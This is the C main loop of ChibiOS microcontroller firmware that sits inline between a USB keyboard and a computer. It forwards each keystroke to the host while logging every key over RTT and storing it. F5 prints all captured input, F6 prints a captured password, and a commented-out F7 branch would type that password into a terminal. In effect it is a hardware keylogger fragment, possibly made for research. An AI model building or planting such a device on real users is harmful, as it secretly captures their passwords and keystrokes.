//main.c

#include "ch.h"
#include "hal.h"

#include "led.h"
#include "rtt.h"
#include "spi.h"
#include "usb.h"
#include "usbh.h"
#include "timer.h"

int main(void)
{
    halInit();
    chSysInit();

    led_init();
    rtt_init();
    spi_init();
    usb_init();
    usbh_init();
    timer_init();

    timer_on();

    uint8_t *report;

    while(1) {
        //mailbox check
        chMBFetch(&umb, (msg_t *)&report, TIME_INFINITE);

        /* send the key on the computer */
        usb_report(&UHD2, report, 8);

        //get every input in a tab
        uint16_t input[6] = {0, 0, 0, 0, 0, 0};
        get_input_hid(report, input);

        rtt_printf("report : %02x %02x %02x %02x %02x %02x %02x %02x",
                   report[0], report[1], report[2], report[3], report[4],
                   report[5], report[6], report[7]);

        int i = 0;
        while(input[i] != 0) {
            rtt_printf("Key: %c (%04x)", hid_to_azerty(input[i]), input[i]);

            usbh_add_input(input[i]);

            if(input[i] == KEY_F5)
                usbh_print_input();
            if(input[i] == KEY_F6)
                usbh_print_password();
            //if(input[i] == KEY_F7)
            //    usb_password_terminal(&UHD2);

            i++;
        }
    }

    return 0;
}
